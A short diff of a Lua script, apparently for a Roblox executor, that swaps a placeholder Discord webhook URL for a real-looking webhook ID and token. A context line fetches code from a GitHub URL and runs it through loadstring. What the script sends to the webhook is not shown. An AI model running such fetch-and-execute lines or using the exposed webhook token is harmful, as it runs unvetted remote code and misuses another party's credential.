@@ -4,7 +4,7 @@
 -- ============================================================
 
 -- ⚠️ CHANGE THIS TO YOUR WEBHOOK URL BEFORE HOSTING
-local WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1524160370107744306/1dMK69XbzTEOtjmJBO0hddaHL1NYdQGkwO8h-mP1N-pSBxYeHaUzLVA0798gvmxa88Ws"
 
 -- Load compatibility layer
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/luau/Executor-API-Docs/master/script/compatibility_layer.lua"))() end)
